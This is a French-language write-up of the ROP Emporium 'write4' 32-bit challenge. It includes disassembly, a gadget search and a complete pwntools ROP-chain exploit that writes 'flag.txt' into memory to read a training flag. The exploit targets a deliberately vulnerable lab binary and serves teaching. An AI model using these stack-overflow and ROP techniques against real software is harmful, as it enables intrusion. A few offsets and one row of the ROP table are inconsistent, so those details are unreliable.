---
Title: Ropemporium x86_32 write4
Date: 2023-06-14
Tags: [linux, python, ROP, x86_32, ropemporium]
Categories: [tutorial]
Author: cdpointpoint
---

# write4

## Description

Le site nous dit :

Things have been rearranged a little for this challenge; the printing logic has been moved into a separate library in an attempt to mitigate the alternate solution that is possible in the callme challenge. The stack smash also takes place in a function within that library, but don't worry this will have no effect on your ROP chain.

Important!
A PLT entry for a function named print_file() exists within the challenge binary, simply call it with the name of a file you wish to read (like "flag.txt") as the 1st argument.

## Decouverte

Le challenge contient trois fichiers.

    -rw-r--r--  1 1000:1000  33          flag.txt
    -rwxr-xr-x  1 1000:1000  7212        libwrite432.so
    -rwxr-xr-x  1 1000:1000  7252        write432

Le programme presente une faille de débordement

    ./write432
    write4 by ROP Emporium
    x86

    Go ahead and give me the input already!

    > AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Thank you!
    Segmentation fault (core dumped)



## Analyse

### Le programe

La fonction main appelle la fonction pwnme qui est importée et présente dans la librairie libwrite432.so

    [0x08048543]> pdf @ sym.main
                ; DATA XREFS from entry0 @ 0x8048416, 0x804841c
    ┌ 36: int main (char **argv);
    │           ; arg char **argv @ esp+0x14
    │           0x08048506      8d4c2404       lea ecx, [argv]
    │           0x0804850a      83e4f0         and esp, 0xfffffff0
    │           0x0804850d      ff71fc         push dword [ecx - 4]
    │           0x08048510      55             push ebp
    │           0x08048511      89e5           mov ebp, esp
    │           0x08048513      51             push ecx
    │           0x08048514      83ec04         sub esp, 4
    │           0x08048517      e894feffff     call sym.imp.pwnme
    │           0x0804851c      b800000000     mov eax, 0
    │           0x08048521      83c404         add esp, 4
    │           0x08048524      59             pop ecx
    │           0x08048525      5d             pop ebp
    │           0x08048526      8d61fc         lea esp, [ecx - 4]
    └           0x08048529      c3             ret


Le programme principale contient une fonction intéressante.

    [0x08048543]> pdf @sym.usefulFunction
    ┌ 25: sym.usefulFunction ();
    │           0x0804852a      55             push ebp
    │           0x0804852b      89e5           mov ebp, esp
    │           0x0804852d      83ec08         sub esp, 8
    │           0x08048530      83ec0c         sub esp, 0xc
    │           0x08048533      68d0850408     push str.nonexistent        ; 0x80485d0 ; "nonexistent"
    │           0x08048538      e893feffff     call sym.imp.print_file
    │           0x0804853d      83c410         add esp, 0x10
    │           0x08048540      90             nop
    │           0x08048541      c9             leave
    └           0x08048542      c3             ret

Appelle l'adresse usefulFunction+14 : 0x08048538 permet d'appeller le fonction print_file située dans la librairie.

On peut donc obtenir le flag en appellant cette adresse avec une adresse contenant "flag.txt".

### La librairie

La fonction pwnme :
``` x86
    [0x000005a0]> pdf @sym.pwnme
    ┌ 178: sym.pwnme ();
    │           ; var void *s @ ebp-0x28
    │           ; var int32_t var_4h @ ebp-0x4
...
    │           0x00000724      6800020000     push 0x200
    │           0x00000729      8d45d8         lea eax, [s]
    │           0x0000072c      50             push eax
    │           0x0000072d      6a00           push 0                      ; int fildes
    │           0x0000072f      e8ccfdffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)

```
La lecture est réalisée à ladresse ebp-0x20 donc au après 32 caractère on va ecraser la sauvegarde de ebp puis l'adresse de retour.

## Contruction de l'exploitation

### Recherche d'une zone memoire inscriptible

    [0x08048543]> iS
    [Sections]

    nth paddr        size vaddr       vsize perm name
    ―――――――――――――――――――――――――――――――――――――――――――――――――
    0   0x00000000    0x0 0x00000000    0x0 ----
    1   0x00000154   0x13 0x08048154   0x13 -r-- .interp
    2   0x00000168   0x20 0x08048168   0x20 -r-- .note.ABI-tag
    3   0x00000188   0x24 0x08048188   0x24 -r-- .note.gnu.build-id
    4   0x000001ac   0x3c 0x080481ac   0x3c -r-- .gnu.hash
    5   0x000001e8   0xb0 0x080481e8   0xb0 -r-- .dynsym
    6   0x00000298   0x8b 0x08048298   0x8b -r-- .dynstr
    7   0x00000324   0x16 0x08048324   0x16 -r-- .gnu.version
    8   0x0000033c   0x20 0x0804833c   0x20 -r-- .gnu.version_r
    9   0x0000035c    0x8 0x0804835c    0x8 -r-- .rel.dyn
    10  0x00000364   0x18 0x08048364   0x18 -r-- .rel.plt
    11  0x0000037c   0x23 0x0804837c   0x23 -r-x .init
    12  0x000003a0   0x40 0x080483a0   0x40 -r-x .plt
    13  0x000003e0    0x8 0x080483e0    0x8 -r-x .plt.got
    14  0x000003f0  0x1c2 0x080483f0  0x1c2 -r-x .text
    15  0x000005b4   0x14 0x080485b4   0x14 -r-x .fini
    16  0x000005c8   0x14 0x080485c8   0x14 -r-- .rodata
    17  0x000005dc   0x44 0x080485dc   0x44 -r-- .eh_frame_hdr
    18  0x00000620  0x114 0x08048620  0x114 -r-- .eh_frame
    19  0x00000efc    0x4 0x08049efc    0x4 -rw- .init_array
    20  0x00000f00    0x4 0x08049f00    0x4 -rw- .fini_array
    21  0x00000f04   0xf8 0x08049f04   0xf8 -rw- .dynamic
    22  0x00000ffc    0x4 0x08049ffc    0x4 -rw- .got
    23  0x00001000   0x18 0x0804a000   0x18 -rw- .got.plt
    24  0x00001018    0x8 0x0804a018    0x8 -rw- .data
    25  0x00001020    0x0 0x0804a020    0x4 -rw- .bss
    26  0x00001020   0x29 0x00000000   0x29 ---- .comment
    27  0x0000104c  0x440 0x00000000  0x440 ---- .symtab
    28  0x0000148c  0x211 0x00000000  0x211 ---- .strtab
    29  0x0000169d  0x105 0x00000000  0x105 ---- .shstrtab


On peut retenir le début de la section .data 0x0804a018 quit fait juste 8 octets avec derrièe la section .bss elle aussi inscriptible.


### Recherche de gadgets

Pour ecrire a l'adresse convenue il nou faut une intruction "mov []"

    ropemporium/x32/write4# ROPgadget --binary write432 --depth 4| grep "mov.*\["
    0x08048543 : mov dword ptr [edi], ebp ; ret
    0x08048423 : mov ebx, dword ptr [esp] ; ret

On retient : 0x08048543 : mov dword ptr [edi], ebp ; ret

Pour charger edi :

    ropemporium/x32/write4# ROPgadget --binary write432 --depth 4| grep "pop edi"
    0x080485aa : pop edi ; pop ebp ; ret
    0x080485a9 : pop esi ; pop edi ; pop ebp ; re

ah ok ! On a un gadget pour nos deux registres.

Comme nous somme sur un architecture 32 bits il faudra plusieurs operations pour ecrire "flag.txt"

### La chaine de ROP

| ROP entry | comment |
| ----------- | ------- |
| 0x080485aa | pop edi; pop ebp; ret |
| 0x0804a018 | .data pour edi|
| b"flag" | pour ebp |
| 0x08048543 | mov dword ptr [edi], ebp ; ret |
| 0x080485aa | pop edi; pop ebp; ret |
| 0x0804a018 | .data pour edi|
| b".txt" | pour ebp |
| 0x08048543 | mov dword ptr [edi], ebp ; ret |
| 0x0804a01c | .data+4 pour edi|
| b".txt" | pour ebp |
| 0x08048543 | mov dword ptr [edi], ebp ; ret |
| 0x0804a020 | .data+8 pour edi|
| 0x00000000 | pour ebp |
| 0x08048543 | mov dword ptr [edi], ebp ; ret |
| 0x08048538 | usefulFunction+14  |
| 0x0804a018 | .data  |

## Exploitation

### Script python

```python

ropemporium/x32/write4# cat solve.py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# break apres le read dans pwnme
gs='''
b *pwnme+177
c
'''

# Set up pwntools for the correct architecture
elf =  ELF('write432')
context.binary=elf

# Offset avant ecrasement de l'adresse de retour
offset=0x2c

usefulFunction=elf.symbols['usefulFunction']
print_file=usefulFunction+14

g_popedi_ebp=0x080485aa

# 0x08048543 : mov dword ptr [edi], ebp ; ret
g_write = 0x08048543

# data=0x0804a018
data = elf.get_section_by_name('.data').header['sh_addr']

io = process([elf.path])

if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)

# io.recvuntil(b"> ")

PL =b"A"*offset
PL+=p32(g_popedi_ebp)
PL+=p32(data)
PL+=b'flag'
PL+=p32(g_write)

PL+=p32(g_popedi_ebp)
PL+=p32(data+4)
PL+=b'.txt'
PL+=p32(g_write)

PL+=p32(g_popedi_ebp)
PL+=p32(data+8)
PL+=p32(0)
PL+=p32(g_write)

PL+=p32(print_file)
PL+=p32(data)


# affichage du prinf correspondant pour mise au point
print("")
print(f"printf %{offset}s"+''.join([ f"\\x{c:02x}" for c in PL[offset:]])+" A")
print("")

io.sendline(PL)
io.interactive()

```
## Execution

    ropemporium/x32/write4# python3 solve.py
    [*] '/w/ropemporium/x32/write4/write432'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
        RUNPATH:  b'.'
    [+] Starting local process '/w/ropemporium/x32/write4/write432': pid 204

    printf %44s\xaa\x85\x04\x08\x18\xa0\x04\x08\x66\x6c\x61\x67\x43\x85\x04\x08\xaa\x85\x04\x08\x1c\xa0\x04\x08\x2e\x74\x78\x74\x43\x85\x04\x08\xaa\x85\x04\x08\x20\xa0\x04\x08\x00\x00\x00\x00\x43\x85\x04\x08\x36\x85\x04\x08\x18\xa0\x04\x08 A

    [*] Switching to interactive mode
    write4 by ROP Emporium
    x86

    Go ahead and give me the input already!

    > Thank you!
    ROPE{a_placeholder_32byte_flag!}
    [*] Got EOF while reading in interactive
